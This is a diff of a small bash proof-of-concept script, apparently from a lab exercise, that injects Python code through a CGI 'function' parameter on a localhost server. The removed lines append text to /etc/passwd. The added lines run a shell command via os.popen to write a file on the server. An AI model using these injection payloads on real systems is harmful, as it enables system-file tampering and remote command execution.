@@ -1,7 +1,5 @@
 #!/usr/bin/env bash
 
-# Append a line to basic.cgi
-curl "http://localhost:4567/cgi-bin/domain.cgi?function=open(%27/etc/passwd%27,%20%27a%27).write(%22Eve was here%22)" 
-
-# Execute basic.cgi 
-curl -s "http://localhost:4567/cgi-bin/basic.cgi"
+# Write a file
+curl 'http://localhost:4567/cgi-bin/domain.cgi' --data 'function=print%28%22%5Cr%5Cn%22+%2B+__import__%28%27os%27%29.popen%28%27echo+new_file+%3E+new_file.txt%27%29.read%28%29%29+and+sys.exit%280%29'
+# File can be found on server at /var/www/cgi-bin/new_file.txt"
